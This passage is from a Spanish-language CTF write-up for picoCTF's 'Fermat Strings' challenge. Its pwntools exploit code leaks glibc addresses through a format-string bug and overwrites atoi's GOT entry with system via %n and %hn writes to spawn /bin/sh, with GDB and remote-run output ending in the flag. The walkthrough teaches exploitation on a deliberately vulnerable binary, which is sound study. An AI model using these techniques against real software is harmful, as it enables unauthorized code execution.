Calculating for A: 1 and B: 1
Welcome to Fermat\'s Last Theorem as a service
A: <span class=code-red>$</span> 
</code></pre></div>
<p>Ahora tenemos más opciones para continuar con la explotación. Lo siguiente es fugar una dirección de Glibc para obtener su versión. El propósito de esto es calcular la dirección real de <code>system</code> y ponerla en otra entrada de la GOT para la fase final.</p>
<p>Para fugar una dirección podemos utilizar la vulnerabilidad de <em>Format String</em>. Para ello, tenemos que llamar a <code>printf</code> con el formato <code>%s</code> (las cadenas de caracteres en C son dadas como punteros) y pasarle una dirección de la GOT (por ejemplo, <code>puts</code>), de manera que el valor de la entrada de la GOT se imprima (funciona como un puntero).</p>
<p>La estrategia es similar: utilizamos la variable <code>A</code> para almacenar la dirección de la GOT para <code>puts</code>. Y después ponemos <code>%11$s</code> en la variable <code>B</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python>puts_got <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x601018</span>
payload_a <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1234567.&#39;</span> <span style=color:#f92672>+</span> p64(puts_got)
payload_b <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1.%11$s&#39;</span>

p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A: &#39;</span>, payload_a)
p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B: &#39;</span>, payload_b)
p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B: 1.&#39;</span>)

puts_addr <span style=color:#f92672>=</span> u64(p<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>))
log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Leaked puts() address: </span><span style=color:#e6db74>{</span>hex(puts_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</code></pre></div><p>Después de esto, podemos calcular la dirección base de Glibc, sabiendo el <em>offset</em> de <code>puts</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ldd</span> chall
        linux-vdso.so.1 (0x00007ffda1df7000)
        libm.so.6 => /lib/x86_64-linux-gnu/libm.so.6 (0x00007f576d29c000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f576d0aa000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f576d3fe000)

<span class=code-cyan>$</span> <span class=code-dark-green>readelf</span> -s /lib/x86_64-linux-gnu/libc.so.6 | <span class=code-dark-green>grep</span> puts
   194: 00000000000875a0   476 FUNC    GLOBAL DEFAULT   16 _IO_<span class=code-red>puts</span>@@GLIBC_2.2.5
   429: 00000000000875a0   476 FUNC    WEAK   DEFAULT   16 <span class=code-red>puts</span>@@GLIBC_2.2.5
   504: 00000000001273c0  1268 FUNC    GLOBAL DEFAULT   16 <span class=code-red>puts</span>pent@@GLIBC_2.2.5
   690: 0000000000129090   728 FUNC    GLOBAL DEFAULT   16 <span class=code-red>puts</span>gent@@GLIBC_2.10
  1158: 0000000000085e60   384 FUNC    WEAK   DEFAULT   16 f<span class=code-red>puts</span>@@GLIBC_2.2.5
  1705: 0000000000085e60   384 FUNC    GLOBAL DEFAULT   16 _IO_f<span class=code-red>puts</span>@@GLIBC_2.2.5
  2342: 00000000000914a0   159 FUNC    WEAK   DEFAULT   16 f<span class=code-red>puts</span>_unlocked@@GLIBC_2.2.5
</code></pre></div>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python>puts_offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x875a0</span>
glibc_base_addr <span style=color:#f92672>=</span> puts_addr <span style=color:#f92672>-</span> puts_offset
log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Glibc base address: </span><span style=color:#e6db74>{</span>hex(glibc_base_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</code></pre></div><p>Con todo esto, hemos fugado la dirección de <code>puts</code> y calculado la dirección base de Glibc:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py
[<span class=code-green>+</span>] Starting local process './chall': pid 414163
[<span class=code-green>+</span>] Leaked puts() address: 0x7f4a695695a0
[<span class=code-green>+</span>] Glibc base address: 0x7f4a694e2000
[<span class=code-blue>*</span>] Switching to interactive mode
Welcome to Fermat\'s Last Theorem as a service
A: <span class=code-red>$</span>
</code></pre></div>
<p>Ahora podemos buscar el <em>offset</em> de <code>system</code> en Glibc:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>readelf</span> -s /lib/x86_64-linux-gnu/libc.so.6 | <span class=code-dark-green>grep</span> system
   236: 0000000000156a80   103 FUNC    GLOBAL DEFAULT   16 svcerr_<span class=code-red>system</span>err@@GLIBC_2.2.5
   617: 0000000000055410    45 FUNC    GLOBAL DEFAULT   16 __libc_<span class=code-red>system</span>@@GLIBC_PRIVATE
  1427: 0000000000055410    45 FUNC    WEAK   DEFAULT   16 <span class=code-red>system</span>@@GLIBC_2.2.5
</code></pre></div>
<p>La idea es modificar la entrada de la GOT de una función que tome como primer argumento una cadena de caracteres controlada por nosotros para que apunte a <code>system</code>. Por ejemplo, funciones de este tipo son <code>atoi</code> y <code>strcspn</code>. Esta vez, estaremos utilizando <code>atoi</code>, cuya dirección en la GOT es <code>0x601058</code>.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python>atoi_got <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x601058</span>

system_offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x55410</span>
system_addr <span style=color:#f92672>=</span> glibc_base_addr <span style=color:#f92672>+</span> system_offset
</code></pre></div><p>Ahora tenemos que escribir la dirección real de <code>system</code> en la entrada GOT de <code>atoi</code>. Vamos a introducir 0 bytes y ver qué valor se inserta en la GOT utilizando GDB como anteriormente:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python>payload_a <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1234567.&#39;</span> <span style=color:#f92672>+</span> p64(pow_got)
payload_b <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1.%11$n&#39;</span>

gdb<span style=color:#f92672>.</span>attach(p, gdbscript<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;break atoi</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>continue</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>got&#39;</span>)

p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A: &#39;</span>, payload_a)
p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B: &#39;</span>, payload_b)

p<span style=color:#f92672>.</span>interactive()
</code></pre></div><p>Si lo ejecutamos, GDB se añade al proceso, se para en <code>atoi</code> y muestra la GOT:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>GOT protection: Partial RelRO | GOT functions: 9

[0x601018] <span class=code-dark-green>puts@GLIBC_2.2.5  →  0x7f660b8465a0</span>
[0x601020] <span class=code-dark-yellow>__stack_chk_fail@GLIBC_2.4  →  0x4006d6</span>
[0x601028] <span class=code-dark-green>setbuf@GLIBC_2.2.5  →  0x7f660b84dc50</span>
[0x601030] <span class=code-dark-green>printf@GLIBC_2.2.5  →  0x7f660b823e10</span>
[0x601038] <span class=code-dark-green>snprintf@GLIBC_2.2.5  →  0x7f660b823ee0</span>
[0x601040] <span class=code-dark-green>pow@GLIBC_2.2.5  →  0x400837</span>
[0x601048] <span class=code-dark-green>strcspn@GLIBC_2.2.5  →  0x7f660b9457b0</span>
[0x601050] <span class=code-dark-green>read@GLIBC_2.2.5  →  0x7f660b8d0130</span>
[0x601058] <span class=code-dark-green>atoi@GLIBC_2.2.5  →  0x7f6600000028</span>
</code></pre></div>
<p>Como se puede ver, la entrada de <code>atoi</code> tiene valor <code>0x7f6600000028</code>. Con <code>%11$n</code> hemos sobreescrito los últimos 4 bytes (es decir, <code>0x00000028</code>). Utilizando el mismo procedimiento de antes, necesitamos escribir un montón de bytes. El número de bytes a introducir se puede calcular como:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python>bytes_on_stack <span style=color:#f92672>=</span> <span style=color:#ae81ff>38</span>
bytes_to_print <span style=color:#f92672>=</span> (system_addr <span style=color:#f92672>-</span> bytes_on_stack <span style=color:#f92672>-</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span>
</code></pre></div><p>Limitamos el número a 4 bytes por si acaso. Y después lo añadimos al <em>payload</em> y lo enviamos:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python>bytes_to_print <span style=color:#f92672>=</span> (system_addr <span style=color:#f92672>-</span> bytes_on_stack <span style=color:#f92672>-</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span>

payload_a <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1234567.&#39;</span> <span style=color:#f92672>+</span> p64(atoi_got) <span style=color:#f92672>+</span> p64(atoi_got <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>)
payload_b <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;1.%</span><span style=color:#e6db74>{</span>bytes_to_print<span style=color:#e6db74>}</span><span style=color:#e6db74>c&#39;</span><span style=color:#f92672>.</span>encode() <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%11$n&#39;</span>

p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A: &#39;</span>, payload_a)
p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B: &#39;</span>, payload_b)
p<span style=color:#f92672>.</span>recvline()

p<span style=color:#f92672>.</span>interactive()
</code></pre></div><p>Si todo es correcto, la entrada de <code>atoi</code> en la GOT apuntará a <code>system</code>. Y por tanto, podemos introducir <code>/bin/sh</code> en <code>A</code> o <code>B</code> y obtener una consola de comandos:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py
[<span class=code-green>+</span>] Starting local process './chall': pid 502833
[<span class=code-green>+</span>] Leaked puts() address: 0x7f4a096565a0
[<span class=code-green>+</span>] Glibc base address: 0x7f4a095cf000
[<span class=code-blue>*</span>] Switching to interactive mode
Welcome to Fermat\'s Last Theorem as a service
A: <span class=code-red>$</span> /bin/sh
B: <span class=code-red>$</span> 
<span class=code-red>$</span> ls
chall  chall.c    Dockerfile  solve.py
</code></pre></div>
<p>Todo bien. Vamos a perfeccionar el <em>exploit</em> un poco para que nos dé la <em>shell</em> automáticamente:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A: &#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/bin/sh&#39;</span>)
p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B: &#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&#39;</span>)

p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B: &#39;</span>)
p<span style=color:#f92672>.</span>sendline()

p<span style=color:#f92672>.</span>interactive()
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py
[<span class=code-green>+</span>] Starting local process './chall': pid 507100
[<span class=code-green>+</span>] Leaked puts() address: 0x7f6218d5b5a0
[<span class=code-green>+</span>] Glibc base address: 0x7f6218cd4000
[<span class=code-blue>*</span>] Switching to interactive mode
<span class=code-red>$</span> ls
chall  chall.c    Dockerfile  solve.py
</code></pre></div>
<p>No obstante, aún no hemos terminado. Tenemos que lanzar el <em>exploit</em> contra la instancia remota y obtener la versión de Glibc. Después, actualizar los <em>offsets</em>.</p>
<p>Para ayudar con la búsqueda de la versión, podemos fugar más direcciones de funciones de Glibc. Para ello, decidí programar una función llamada <code>leak_address</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>leak_address</span>(got_entry: int) <span style=color:#f92672>-&gt;</span> int:
    payload_a <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1234567.&#39;</span> <span style=color:#f92672>+</span> p64(got_entry)
    payload_b <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1.%11$s&#39;</span>

    p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A: &#39;</span>, payload_a)
    p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B: &#39;</span>, payload_b)
    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B: 1.&#39;</span>)

    <span style=color:#66d9ef>return</span> u64(p<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>))
</code></pre></div><p>De manera que se utilice así:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python>atoi_got <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x601058</span>
atoi_addr <span style=color:#f92672>=</span> leak_address(atoi_got)
log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Leaked atoi() address: </span><span style=color:#e6db74>{</span>hex(atoi_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)

puts_got <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x601018</span>
puts_addr <span style=color:#f92672>=</span> leak_address(puts_got)
log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Leaked puts() address: </span><span style=color:#e6db74>{</span>hex(puts_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</code></pre></div><p>Lanzamos el <em>exploit</em> al servidor y no funciona. Sin problema por ahora. Vamos a verificar las direcciones fugadas:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py mars.picoctf.net 31929
[<span class=code-green>+</span>] Opening connection to mars.picoctf.net on port 31929: Done
[<span class=code-green>+</span>] Leaked atoi() address: 0x7f026a26c730
[<span class=code-green>+</span>] Leaked puts() address: 0x7f026a2ac5a0
[<span class=code-green>+</span>] Glibc base address: 0x7f026a225000
</code></pre></div>
<p>Estas son las versiones de Glibc encontradas (sus <em>offsets</em> son los mismos):</p>
<p><img src=/images/picoCTF/fermat-strings-libc.png alt="Glibc Version"></p>
<p>Observamos que la versión de Glibc que tiene la instancia remota es la misma que tenemos en local.</p>
<p>Sin embargo, parece que la última etapa del <em>exploit</em> no funciona en remoto. Esto puede deberse a que estamos imprimiendo una gran cantidad de bytes para poder utilizar <code>%n</code>. Una mamera más elegante es usar <code>%hhn</code> para escribir un solo byte o <code>%hn</code> para escribir 2 bytes.</p>
<p>Vamos a modificar el <em>payload</em> para tener un <em>exploit</em> más estable. Por el momento, utilizaremos <code>%hn</code>. Los últimos bytes de la GOT pueden ser sobreescritos de manera similar a la de antes, solo con algunos cambios:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python>bytes_to_print <span style=color:#f92672>=</span> ((system_addr <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffff</span>) <span style=color:#f92672>-</span> bytes_on_stack <span style=color:#f92672>-</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>0xffff</span>

payload_a <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1234567.&#39;</span> <span style=color:#f92672>+</span> p64(atoi_got) <span style=color:#f92672>+</span> p64(atoi_got <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>)
payload_b <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;1.%</span><span style=color:#e6db74>{</span>bytes_to_print<span style=color:#e6db74>}</span><span style=color:#e6db74>c&#39;</span><span style=color:#f92672>.</span>encode() <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%11$hn&#39;</span>

payload_b <span style=color:#f92672>+=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;%12$hn&#39;</span><span style=color:#f92672>.</span>encode()

gdb<span style=color:#f92672>.</span>attach(p, gdbscript<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;break atoi</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>continue</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>c</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>c</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>got&#39;</span>)

p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A: &#39;</span>, payload_a)
p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B: &#39;</span>, payload_b)
p<span style=color:#f92672>.</span>recvline()

p<span style=color:#f92672>.</span>interactive()
</code></pre></div><p>Lo primero a notar es el uso de operadores AND para coger los 2 últimos bytes de la dirección de <code>system</code>. Y luego está el operador módulo <code>0xffff</code> para evitar números negativos. Después utilizamos <code>%11$hn</code>.</p>
<p>Para sobreescribir los siguientes 2 bytes, necesitamos poner la dirección de <code>atoi</code> en la GOT pero más 2 (ya que queremos escribir los siguientes 2 bytes). Y por tanto, necesitamos utilizar <code>%12$hn</code>. Por el momento, dejamos la segunda parte varía (solo <code>%12$hn</code>).</p>
<p>Añadimos el proceso a GDB y mostramos las entradas de la GOT:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>GOT protection: Partial RelRO | GOT functions: 9

[0x601018] <span class=code-dark-green>puts@GLIBC_2.2.5  →  0x7f70473075a0</span>
[0x601020] <span class=code-dark-yellow>__stack_chk_fail@GLIBC_2.4  →  0x4006d6</span>
[0x601028] <span class=code-dark-green>setbuf@GLIBC_2.2.5  →  0x7f704730ec50</span>
[0x601030] <span class=code-dark-green>printf@GLIBC_2.2.5  →  0x7f70472e4e10</span>
[0x601038] <span class=code-dark-green>snprintf@GLIBC_2.2.5  →  0x7f70472e4ee0</span>
[0x601040] <span class=code-dark-yellow>pow@GLIBC_2.2.5  →  0x400837</span>
[0x601048] <span class=code-dark-green>strcspn@GLIBC_2.2.5  →  0x7f70474067b0</span>
[0x601050] <span class=code-dark-green>read@GLIBC_2.2.5  →  0x7f7047391130</span>
[0x601058] <span class=code-dark-green>atoi@GLIBC_2.2.5  →  0x7f7054105410</span>
</code></pre></div>
<p>Se observa que los dos últimos bytes fueron sobreescritos correctamente (al menos los 3 últimos dígitos hexadecimales son <code>410</code>, coinciden con el <em>offset</em> de <code>system</code>). Y además, vemos que los siguientes 2 bytes tienen el mismo valor que los 2 últimos bytes (<code>5410</code>).</p>
<p>Sabiendo esto, podemos calcular el número de bytes a escribir para lograr poner el número correcto en esa posición:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python>bytes_to_print <span style=color:#f92672>=</span> ((system_addr <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffff</span>) <span style=color:#f92672>-</span> bytes_on_stack <span style=color:#f92672>-</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>0xffff</span>

payload_a <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1234567.&#39;</span> <span style=color:#f92672>+</span> p64(atoi_got) <span style=color:#f92672>+</span> p64(atoi_got <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>)
payload_b <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;1.%</span><span style=color:#e6db74>{</span>bytes_to_print<span style=color:#e6db74>}</span><span style=color:#e6db74>c&#39;</span><span style=color:#f92672>.</span>encode() <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%11$hn&#39;</span>

bytes_to_print <span style=color:#f92672>=</span> (((system_addr <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>16</span>) <span style=color:#f92672>-</span> system_addr) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffff</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>0xffff</span>

payload_b <span style=color:#f92672>+=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;%</span><span style=color:#e6db74>{</span>bytes_to_print<span style=color:#e6db74>}</span><span style=color:#e6db74>c&#39;</span><span style=color:#f92672>.</span>encode() <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%12$hn&#39;</span>

gdb<span style=color:#f92672>.</span>attach(p, gdbscript<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;break atoi</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>continue</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>c</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>c</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>got&#39;</span>)

p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A: &#39;</span>, payload_a)
p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B: &#39;</span>, payload_b)
p<span style=color:#f92672>.</span>recvline()

p<span style=color:#f92672>.</span>interactive()
</code></pre></div><p>Y todo funciona genial en local:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py
[<span class=code-green>+</span>] Starting local process './chall': pid 547640
[<span class=code-green>+</span>] Leaked atoi() address: 0x7f05651e4730
[<span class=code-green>+</span>] Leaked puts() address: 0x7f05652245a0
[<span class=code-green>+</span>] Glibc base address: 0x7f056519d000
[<span class=code-blue>*</span>] Switching to interactive mode
<span class=code-red>$</span> ls
chall  chall.c    Dockerfile  solve.py
</code></pre></div>
<p>Vamos a ver en remoto:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py mars.picoctf.net 31929
[<span class=code-green>+</span>] Opening connection to mars.picoctf.net on port 31929: Done
[<span class=code-green>+</span>] Leaked atoi() address: 0x7fc3974da730
[<span class=code-green>+</span>] Leaked puts() address: 0x7fc39751a5a0
[<span class=code-green>+</span>] Glibc base address: 0x7fc397493000
[<span class=code-blue>*</span>] Switching to interactive mode
<span class=code-red>$</span> ls
flag.txt
run
<span class=code-red>$</span> cat flag.txt
picoCTF{f3rm4t_pwn1ng_s1nc3_th3_17th_c3ntury}
</code></pre></div>
<div class="mt6 instapaper_ignoref">
</div>
</div>
</article>
</main>
<footer class="bg-black bottom-0 w-100 pa3" role=contentinfo>
<div class="flex justify-between">
<a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a>
<div style=margin-top:8px>
<div>
<div>
<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
